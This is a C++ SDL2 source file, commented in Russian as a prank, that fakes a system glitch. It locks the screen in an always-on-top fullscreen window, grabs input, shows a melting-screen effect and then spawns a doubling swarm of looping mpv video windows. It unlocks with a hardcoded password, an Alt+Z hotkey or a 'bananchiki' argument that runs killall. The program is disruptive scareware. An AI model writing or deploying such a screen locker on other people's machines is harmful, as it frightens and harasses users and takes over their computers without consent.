#include <SDL2/SDL.h>
#include <iostream>
#include <string>
#include <cstdlib>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fstream>
#include <vector>
#include <cmath>

const std::string CORRECT_PASSWORD = "123321";
bool g_running = true;

std::string getVideoPath() {
    char buf[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len != -1) {
        buf[len] = '\0';
        std::string path(buf);
        size_t pos = path.find_last_of("/\\");
        if (pos != std::string::npos) path = path.substr(0, pos);
        return path + "/UI/Sounds/Loading Background/video.mkv";
    }
    return "UI/Sounds/Loading Background/video.mkv";
}

// Поток спама с лимитом окон
int spamThread(void* data) {
    // Ждем окончания эффекта «плывущего экрана» (например, 6 секунд)
    SDL_Delay(6000);

    std::string videoPath = getVideoPath();
    int count = 1;
    const int MAX_WINDOWS_LIMIT = 32; // Жесткий лимит, чтобы не крашнуть систему насмерть

    while (g_running && count <= MAX_WINDOWS_LIMIT) {
        for (int i = 0; i < count && g_running; ++i) {
            pid_t pid = fork();
            if (pid == 0) {
                execlp("mpv", "mpv", "--no-terminal", "--loop=inf", videoPath.c_str(), NULL);
                execlp("xdg-open", "xdg-open", videoPath.c_str(), NULL);
                exit(0);
            }
            SDL_Delay(100);
        }

        SDL_Delay(2500);
        count *= 2; // Геометрическая прогрессия
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc > 1 && std::string(argv[1]) == "bananchiki") {
        system("killall -9 lockscreen mpv xdg-open >nul 2>&1");
        return 0;
    }

    if (SDL_Init(SDL_INIT_VIDEO) < 0) return 1;

    SDL_Window* window = SDL_CreateWindow(
        "System Glitch",
        SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED,
        0, 0,
        SDL_WINDOW_FULLSCREEN_DESKTOP | SDL_WINDOW_ALWAYS_ON_TOP | SDL_WINDOW_BORDERLESS
    );

    // Включаем поддержку полупрозрачности для эффектов
    SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);
    
    SDL_SetWindowGrab(window, SDL_TRUE);
    SDL_ShowCursor(SDL_DISABLE);

    SDL_Thread* thread = SDL_CreateThread(spamThread, "SpamThread", NULL);

    Uint32 startTime = SDL_GetTicks();
    std::string inputBuffer = "";
    SDL_Event e;

    while (g_running) {
        Uint32 currentTime = SDL_GetTicks();
        float elapsed = (currentTime - startTime) / 1000.0f;

        while (SDL_PollEvent(&e) != 0) {
            if (e.type == SDL_KEYDOWN) {
                // Экстренный хоткей: Alt + Z для моментального сноса всего пранка
                const Uint8* state = SDL_GetKeyboardState(NULL);
                if ((state[SDL_SCANCODE_LALT] || state[SDL_SCANCODE_RALT]) && state[SDL_SCANCODE_Z]) {
                    g_running = false;
                }

                if (e.key.keysym.sym == SDLK_RETURN) {
                    if (inputBuffer == CORRECT_PASSWORD) {
                        g_running = false;
                    } else {
                        inputBuffer = "";
                    }
                } else if (e.key.keysym.sym == SDLK_BACKSPACE && !inputBuffer.empty()) {
                    inputBuffer.pop_back();
                } else if (e.key.keysym.sym >= SDLK_SPACE && e.key.keysym.sym <= SDLK_z) {
                    inputBuffer += static_cast<char>(e.key.keysym.sym);
                }
            }
        }

        // ЭТАП 1: Первые 6 секунд — эффект «плывущего/тающего» экрана (искажение пикселей волной)
        SDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);
        SDL_RenderClear(renderer);

        if (elapsed < 6.0f) {
            // Рисуем процедурные искаженные линии/волны для имитации расплывания экрана
            int w, h;
            SDL_GetWindowSize(window, &w, &h);
            for (int y = 0; y < h; y += 10) {
                int offsetX = static_cast<int>(std::sin(elapsed * 5.0f + y * 0.05f) * 20.0f * (elapsed / 6.0f));
                SDL_SetRenderDrawColor(renderer, 20, 20 + (y % 40), 40, 100);
                SDL_Rect waveRect = { offsetX, y, w, 6 };
                SDL_RenderFillRect(renderer, &waveRect);
            }
        }

        SDL_RenderPresent(renderer);
        SDL_Delay(16);
    }

    // Зачистка процессов при выходе (по паролю или по Alt + Z)
    system("killall -9 mpv xdg-open >nul 2>&1");

    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    SDL_Quit();

    return 0;
}
